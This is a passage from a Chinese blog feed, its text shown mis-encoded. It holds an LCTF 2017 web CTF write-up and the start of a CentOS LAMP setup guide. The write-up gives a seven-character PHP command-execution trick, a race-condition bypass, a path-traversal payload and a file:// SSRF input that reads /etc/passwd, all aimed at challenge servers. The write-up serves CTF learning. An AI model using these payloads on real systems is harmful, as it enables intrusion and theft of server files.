<h2 id="0x01ä¸ƒä¸ªå­—ç¬¦getshell"><a href="#0x01ä¸ƒä¸ªå­—ç¬¦getshell" class="headerlink" title="0x01ä¸ƒä¸ªå­—ç¬¦getshell"></a>0x01ä¸ƒä¸ªå­—ç¬¦getshell</h2><p>d067a0fa9dc61a6e7195ca99696b5a896.phpæ˜¯ä¸ªç±»ä¼¼ä¸Šä¼ çš„é¡µé¢ï¼Œå¯ä»¥åœ¨æœåŠ¡å™¨çš„ä¸€ä¸ªä¸“å±æ–‡ä»¶å¤¹ç”ŸæˆæŒ‡å®šæ–‡ä»¶åå’Œå†…å®¹çš„æ–‡ä»¶ï¼Œä¸€å¼€å§‹ä»¥ä¸ºå¯ä»¥é€šè¿‡<code>content[]</code>ç»•è¿‡é•¿åº¦é™åˆ¶ï¼Œæ— æœï¼Œç„¶ågoogleåˆ°äº†åŸé¢˜<br><a href="http://c.colabug.com/article-2421-1.html" target="_blank" rel="noopener">http://c.colabug.com/article-2421-1.html</a><br>ä¼ ä¸‰ä¸ªæ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">æ–‡ä»¶å    å†…å®¹</div><div class="line">bash      éšæ„</div><div class="line">bb        7ä¸ªå­—ç¬¦å†…çš„å‘½ä»¤</div><div class="line">z.php     &lt;?=`*`;</div></pre></td></tr></table></figure></p>
<p><code>z.php</code>ä¸­çš„<code>&lt;?=`*`;</code>åˆšå¥½7ä¸ªå­—ç¬¦ï¼Œè®¿é—®åèƒ½æŠŠå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æŒ‰å­—æ¯é¡ºåºåˆ—å‡ºï¼Œç„¶åæ‰§è¡Œã€‚<br>ä¼ å¥½ä¸Šé¢3ä¸ªæ–‡ä»¶åï¼Œå½“å‰æ–‡ä»¶å¤¹å°±æœ‰4ä¸ªæ–‡ä»¶äº†ï¼ŒæŒ‰å­—æ¯æ’åºå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash bb index.html(é¢˜ç›®è‡ªå¸¦) z.php</div></pre></td></tr></table></figure></p>
<p>è®¿é—®z.phpåï¼Œç›¸å½“äºæ‰§è¡Œäº†<code>bash bb index.php z.php</code><br>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦é€šè¿‡ä¿®æ”¹bbæ¥æ‰§è¡Œ7ä¸ªå­—ç¬¦ä»¥å†…çš„å‘½ä»¤<br>bbçš„å†…å®¹åˆ†åˆ«ä¸º<code>ls /</code>å’Œ<code>cat /3*</code><br><img src="/img/2017lctf1.png" alt=""></p>
<h1 id="èŒèŒå“’æŠ¥åç³»ç»Ÿ"><a href="#èŒèŒå“’æŠ¥åç³»ç»Ÿ" class="headerlink" title="èŒèŒå“’æŠ¥åç³»ç»Ÿ"></a>èŒèŒå“’æŠ¥åç³»ç»Ÿ</h1><p>å¤©ä¾èŠ±äº†ä¸€æ•´å¤©çš„æ—¶é—´ç”¨IDEå¼€å‘äº†ä¸€ä¸ªæŠ¥åç³»ç»Ÿï¼Œç°åœ¨å¥¹ç¡ç€äº†ï¼Œéš¾é“ä½ ä»¬ä¸æƒ³åšç‚¹ä»€ä¹ˆå˜›XD?<br><a href="http://123.206.120.239/" target="_blank" rel="noopener">http://123.206.120.239/</a></p>
<h2 id="0x00ä¸‹è½½æºç "><a href="#0x00ä¸‹è½½æºç " class="headerlink" title="0x00ä¸‹è½½æºç "></a>0x00ä¸‹è½½æºç </h2><p>æç¤ºäº†IDEå¼€å‘<br>æ‰«åˆ°äº†<code>http://123.206.120.239/.idea/workspace.xml</code><br><img src="/img/2017lctf5.png" alt=""><br>ä¸‹è½½åˆ°äº†æºç <br>login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	session_start();</div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">	$username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</div><div class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">32</span> || strlen($password) &gt; <span class="number">32</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT password FROM users WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] !== $password) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'wrong password'</span>);</div><div class="line">    &#125;</div><div class="line">    $_SESSION[<span class="string">'username'</span>] = $username;</div><div class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'is_logined'</span>]);</div><div class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'is_guest'</span>]);</div><div class="line">	<span class="comment">#echo $username;</span></div><div class="line">	header(<span class="string">"Location: member.php"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>member.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	error_reporting(<span class="number">0</span>);</div><div class="line">	session_start();</div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) === <span class="keyword">false</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'please login first'</span>);</div><div class="line">    &#125;</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT identity FROM identities WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $_SESSION[<span class="string">'username'</span>]]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'GUEST'</span>) &#123;</div><div class="line">        $_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $_SESSION[<span class="string">'is_logined'</span>] = <span class="keyword">true</span>;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'is_logined'</span>]) === <span class="keyword">false</span> || <span class="keyword">isset</span>($_SESSION[<span class="string">'is_guest'</span>]) === <span class="keyword">true</span>) &#123;</div><div class="line"></div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])===<span class="keyword">false</span>)</div><div class="line">			<span class="keyword">echo</span> <span class="string">"None"</span>;</div><div class="line">		<span class="keyword">elseif</span>(is_file($_GET[<span class="string">'file'</span>]))</div><div class="line">			<span class="keyword">echo</span> <span class="string">"you cannot give me a file"</span>;</div><div class="line">		<span class="keyword">else</span></div><div class="line">			readfile($_GET[<span class="string">'file'</span>]);</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body background=<span class="string">"./images/1.jpg"</span>&gt;</div><div class="line">&lt;object type=<span class="string">"application/x-shockwave-flash"</span> style=<span class="string">"outline:none;"</span> data=<span class="string">"http://cdn.abowman.com/widgets/hamster/hamster.swf?"</span> width=<span class="string">"300"</span> height=<span class="string">"225"</span>&gt;&lt;param name=<span class="string">"movie"</span> value=<span class="string">"http://cdn.abowman.com/widgets/hamster/hamster.swf?"</span>&gt;&lt;/param&gt;&lt;param name=<span class="string">"AllowScriptAccess"</span> value=<span class="string">"always"</span>&gt;&lt;/param&gt;&lt;param name=<span class="string">"wmode"</span> value=<span class="string">"opaque"</span>&gt;&lt;/param&gt;&lt;/object&gt;</div><div class="line">&lt;p style=<span class="string">"color:orange"</span>&gt;ä½ å¥½å•Šï¼Œä½†æ˜¯ä½ å¥½åƒä¸æ˜¯XDSECçš„äºº,æ‰€ä»¥æˆ‘å°±ä¸ç»™ä½ flagå•¦~~&lt;/p&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>register.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">	$admin = <span class="string">"xdsec"</span>.<span class="string">"###"</span>.str_shuffle(<span class="string">'you_are_the_member_of_xdsec_here_is_your_flag'</span>);</div><div class="line">    $username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</div><div class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</div><div class="line">    $code = (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]) === <span class="keyword">true</span>) ? (string)$_POST[<span class="string">'code'</span>] : <span class="string">''</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">16</span> || strlen($username) &gt; <span class="number">16</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT username FROM users WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch() !== <span class="keyword">false</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'username has been registered'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO users (username, password) VALUES (:username, :password)'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':password'</span> =&gt; $password]);</div><div class="line"></div><div class="line">    preg_match(<span class="string">'/^(xdsec)((?:###|\w)+)$/i'</span>, $code, $matches);</div><div class="line">    <span class="keyword">if</span> (count($matches) === <span class="number">3</span> &amp;&amp; $admin === $matches[<span class="number">0</span>]) &#123;</div><div class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, :identity)'</span>);</div><div class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':identity'</span> =&gt; $matches[<span class="number">1</span>]]);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, "GUEST")'</span>);</div><div class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("register success");location.href="./index.html"&lt;/script&gt;'</span>;</div></pre></td></tr></table></figure></p>
<h2 id="0x01ç«äº‰ç»•è¿‡èº«ä»½æ£€æµ‹"><a href="#0x01ç«äº‰ç»•è¿‡èº«ä»½æ£€æµ‹" class="headerlink" title="0x01ç«äº‰ç»•è¿‡èº«ä»½æ£€æµ‹"></a>0x01ç«äº‰ç»•è¿‡èº«ä»½æ£€æµ‹</h2><p>ä¸€å¼€å§‹ä¸€ç›´ä»¥ä¸ºè¦é¢„æµ‹<code>str_shuffle()</code>æ‰“ä¹±çš„å­—ç¬¦ä¸²ï¼Œæ— æœï¼Œåˆ†æä»£ç å‘ç°æ³¨å†Œçš„æ—¶å€™æ˜¯å…ˆå°†<code>ç”¨æˆ·åå¯†ç æ’å…¥æ•°æ®åº“</code>ï¼Œå†åˆ¤æ–­æ³¨å†Œç æ˜¯å¦æ­£ç¡®ï¼Œç„¶åæ’å…¥ç”¨æˆ·èº«ä»½ï¼Œè€Œmember.phpä¸­åˆ¤æ–­ç”¨æˆ·èº«ä»½çš„é€»è¾‘ç”¨çš„æ˜¯<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'GUEST'</span>) &#123;</div><div class="line">  $_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>åªè¦ä¸ä¸º<code>GUEST</code>å³å¯æ‰§è¡Œåé¢çš„ä»£ç <br>æƒ³åˆ°é€šè¿‡ç«äº‰ï¼Œåœ¨<code>GUEST</code>è¿˜æ²¡æ›´æ–°è¿›æ•°æ®åº“çš„æ—¶å€™å°±ç™»å½•å¹¶è®¿é—®member.phpï¼Œä»è€Œè·³è¿‡èº«ä»½éªŒè¯<br>è¿™é‡Œæˆ‘çš„æ“ä½œæ˜¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.burpsuite Intruderæ— é™POST login.phpè¿›è¡Œç™»å½•æ“ä½œ</div><div class="line">2.burpsuite Intruderæ— é™GET member.php</div><div class="line">3.åœ¨å‰é¢ä¸¤ä¸ªéƒ½åœ¨è·‘çš„æƒ…å†µä¸‹æ³¨å†Œä¸€ä¸ªè´¦å·</div></pre></td></tr></table></figure></p>
<p>è¦æ³¨æ„çš„æ˜¯ä¸‰ä¸ªæ“ä½œçš„cookieå¿…é¡»ç›¸åŒï¼Œ1å’Œ3ä¸­çš„è´¦å·å¯†ç è¦ç›¸åŒï¼Œè¿™æ ·åœ¨æ³¨å†Œçš„åŒæ—¶å°±å®Œæˆäº†ç™»å½•æ“ä½œå¹¶ä¸”è®¿é—®äº†memberå¹¶ç»•è¿‡èº«ä»½æ£€æµ‹å¯ä»¥æ‰§è¡Œä¸‹ä¸€éƒ¨åˆ†ä»£ç <br>emmmmmmmmï¼Œçœ‹äº†æ“ä½œå’Œflagçš„å†…å®¹ï¼Œæ„Ÿè§‰æˆ‘ç”¨äº†éé¢„æœŸè§£ï¼Œé¢„æœŸè§£åº”è¯¥æ˜¯é€šè¿‡è¾“å…¥è¶…é•¿çš„<code>xdsec###</code>å¼€å¤´çš„å­—ç¬¦ä¸²è®©regiest.phpä¸­çš„æ­£åˆ™åŒ¹é…å‡½æ•°å´©æºƒï¼Œä»è€Œæ— æ³•æ³¨å…¥ç”¨æˆ·GUESTèº«ä»½ï¼Œåé¢çš„å°±éƒ½ä¸€æ ·äº†</p>
<h2 id="0x02æ–‡ä»¶åŒ…å«è¯»å–config-php"><a href="#0x02æ–‡ä»¶åŒ…å«è¯»å–config-php" class="headerlink" title="0x02æ–‡ä»¶åŒ…å«è¯»å–config.php"></a>0x02æ–‡ä»¶åŒ…å«è¯»å–config.php</h2><p>å…³é”®ä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])===<span class="keyword">false</span>)</div><div class="line">	<span class="keyword">echo</span> <span class="string">"None"</span>;</div><div class="line"><span class="keyword">elseif</span>(is_file($_GET[<span class="string">'file'</span>]))</div><div class="line">	<span class="keyword">echo</span> <span class="string">"you cannot give me a file"</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line">  readfile($_GET[<span class="string">'file'</span>]);</div></pre></td></tr></table></figure></p>
<p>è¿™é‡Œæ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?file=./x/../config.php</div></pre></td></tr></table></figure></p>
<p>å› ä¸ºxæ–‡ä»¶å¤¹ä¸å­˜åœ¨ï¼Œæ‰€ä»¥å°±èƒ½ç»•è¿‡<code>is_file()</code>è¯»å–åˆ°<code>config.php</code>ï¼Œflagå°±åœ¨é‡Œé¢<br><img src="/img/2017lctf6.png" alt=""></p>
<h1 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h1><p>è¿™æ˜¯ä¸€ä¸ªæ‹¼æ‰‹é€ŸæŠ¢é‚€è¯·ç çš„é¢˜<br><a href="http://211.159.161.162/test.php" target="_blank" rel="noopener">http://211.159.161.162/test.php</a><br>hint: æœ¬åœ°</p>
<p>è¿™é“é¢˜ç›¸å¯¹æ²¡å‰é¢çš„å¤æ‚ï¼Œfuzzå‘ç°åªèƒ½æäº¤<code>åè®®å://www.baidu.com</code>è¿™æ ·çš„å€¼ï¼Œå¦åˆ™error<br>æ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?site=file://www.baidu.com/etc/passwd%23</div></pre></td></tr></table></figure></p>
<p>æˆåŠŸè¯»å–<code>/etc/passwd</code>ï¼Œå‘ç°lctfç”¨æˆ·ï¼Œå†ç”¨ç›¸åŒæ–¹æ³•è¯»å–<code>/home/lctf/flag</code>å¾—åˆ°flag<br><img src="/img/2017lctf3.png" alt=""></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å‘¨æœ«æ‰“äº†ä¸¤å¤©è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šéªšæ“ä½œï¼Œä½†æ˜¯æ²¡æœ‰é€†å‘å’Œpwnçš„åˆ†æ•°æ‰€ä»¥åˆ†æ•°å·®å¾ˆå¤šï¼Œæœ€åè¿˜æ˜¯è†œä¸€ä¸‹å„ä½å¤§ä½¬ä»¬~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‘¨æœ«åˆšåˆšç»“æŸçš„LCTFï¼Œæˆ‘ä»¬é˜Ÿä¸€å…±åšå‡ºäº†4é“webï¼Œä¸€é“miscè¿˜æœ‰ä¸€é“é—®å·è°ƒæŸ¥ï¼ˆå¥½æ°”å•Šæ²¡æŠ¢åˆ°ä¸€è¡€æ¢pwnhubé‚€è¯·ç ï¼‰ï¼Œæ„Ÿè°¢&lt;code&gt;åƒé¥­å»&lt;/code&gt;å¤§ä½¬å¸¦é£~&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="æ³¨å…¥" scheme="https://www.codemonster.cn/tags/%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Misc" scheme="https://www.codemonster.cn/tags/Misc/"/>
    
      <category term="Web" scheme="https://www.codemonster.cn/tags/Web/"/>
    
      <category term="CBCå­—èŠ‚ç¿»è½¬æ”»å‡»" scheme="https://www.codemonster.cn/tags/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    
      <category term="Padding oracleæ”»å‡»" scheme="https://www.codemonster.cn/tags/Padding-oracle%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Centos7æ­å»ºLAMPç¯å¢ƒ</title>
    <link href="https://www.codemonster.cn/2017/11/16/lamp-creat/"/>
    <id>https://www.codemonster.cn/2017/11/16/lamp-creat/</id>
    <published>2017-11-16T14:40:09.000Z</published>
    <updated>2018-05-04T07:47:50.016Z</updated>
    
    <content type="html"><![CDATA[<p>å¾ˆä¹…ä¹‹å‰å¸®è€å¸ˆå†™çš„LAMPï¼ˆlinux+apache+mysql+phpï¼‰æ•™ç¨‹ï¼Œè‡ªå·±ä¹Ÿç”¨è¿™ä¸ªæ–¹æ³•é…äº†å¥½å¤šå°æœåŠ¡å™¨ï¼Œå‘åˆ°åšå®¢è®°å½•ä¸€ä¸‹ï¼Œä¹Ÿå¸Œæœ›èƒ½ç»™å¤§å®¶å¸¦æ¥ä¸€äº›å¸®åŠ©ã€‚<br><a id="more"></a></p>
<h1 id="æ›´æ–°yum"><a href="#æ›´æ–°yum" class="headerlink" title="æ›´æ–°yum"></a>æ›´æ–°yum</h1><p>ä»¥å…¨æ–°centos7ç³»ç»Ÿä¸ºä¾‹å­ï¼ˆç¡®ä¿è‡ªå·±æ‹¥æœ‰rootæƒé™ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum update</div></pre></td></tr></table></figure></p>
<h1 id="PHP5-6å®‰è£…"><a href="#PHP5-6å®‰è£…" class="headerlink" title="PHP5.6å®‰è£…"></a>PHP5.6å®‰è£…</h1><h2 id="1ã€ç™¾åº¦æœç´¢webtatic-æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬å·é€‰æ‹©yumæºå¹¶å®‰è£…"><a href="#1ã€ç™¾åº¦æœç´¢webtatic-æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬å·é€‰æ‹©yumæºå¹¶å®‰è£…" class="headerlink" title="1ã€ç™¾åº¦æœç´¢webtatic  æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬å·é€‰æ‹©yumæºå¹¶å®‰è£…"></a>1ã€ç™¾åº¦æœç´¢webtatic  æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬å·é€‰æ‹©yumæºå¹¶å®‰è£…</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://webtatic.com/packages/php56/</div></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘é€‰æ‹©äº†centos7çš„<code>php56</code>ç‰ˆæœ¬<br>è¿è¡Œå¦‚ä¸‹è¯­å¥<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</div><div class="line">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</div></pre></td></tr></table></figure></p>
<h2 id="2ã€å®‰è£…phpåŠå…¶æ‹“å±•"><a href="#2ã€å®‰è£…phpåŠå…¶æ‹“å±•" class="headerlink" title="2ã€å®‰è£…phpåŠå…¶æ‹“å±•"></a>2ã€å®‰è£…phpåŠå…¶æ‹“å±•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">yum install php56w</div><div class="line">yum install php56w-devel</div><div class="line">yum install php56w-mysqli</div><div class="line">yum install php56w-mbstring</div><div class="line">yum install php56w-gd</div><div class="line">yum install php56w-xmlwriter</div></pre></td></tr></table></figure>
<p>ä¸€è·¯æŒ‰YåŒæ„å®‰è£…<br>ä»¥ä¸Šå®‰è£…ä¼š<code>é»˜è®¤æ‰§è¡Œç¼–è¯‘å®‰è£…Apache</code><br>è‹¥ä¸ç¡®å®šè‡ªå·±æœåŠ¡å™¨é‡ä½¿ç”¨äº†ä»€ä¹ˆphpæ‹“å±•ï¼Œè¯·æ‰§è¡Œ<code>yum install php56w*</code></p>
<h1 id="Apache-é…ç½®"><a href="#Apache-é…ç½®" class="headerlink" title="Apache é…ç½®"></a>Apache é…ç½®</h1><p>è¿›å…¥<code>/etc/httpd/conf.d</code>ç›®å½•ä¸‹ï¼Œåˆ é™¤é™¤<code>php.conf</code>ä»¥å¤–æ–‡ä»¶<br>ç„¶åè¿›è¡Œè™šæ‹Ÿä¸»æœºé…ç½®<br>åœ¨<code>/etc/httpd/conf.d/</code>ç›®å½•æ–°å»ºä»»æ„ä¸€ä¸ªconfæ–‡ä»¶ï¼Œå¦‚<code>test.conf</code><br>åˆ›å»ºçš„.confæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œåç»­ç»‘å®šåŸŸåä»€ä¹ˆçš„ä¹Ÿæ˜¯åœ¨è¿™é‡Œ<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></div><div class="line">     ServerName 127.0.0.1:80   </div><div class="line">     DocumentRoot /work/WEBROOT/default/</div><div class="line">     ErrorLog  /work/log/default_error.log</div><div class="line">     CustomLog  /work/log/default_access.log combined</div><div class="line">     <span class="tag">&lt;<span class="name">Directory</span> "/<span class="attr">work</span>/<span class="attr">WEBROOT</span>/<span class="attr">default</span>"&gt;</span></div><div class="line">         AllowOverride All</div><div class="line">        Order allow,deny</div><div class="line">        Require all granted</div><div class="line">        Allow from all</div><div class="line">     <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>å¹¶æ ¹æ®å®é™…æƒ…å†µå»ºç«‹webç›®å½•ï¼Œå¦‚<code>/work/</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mkdir /work/WEBROOT/default -p</div><div class="line">mkdir /work/log/default -p</div></pre></td></tr></table></figure></p>
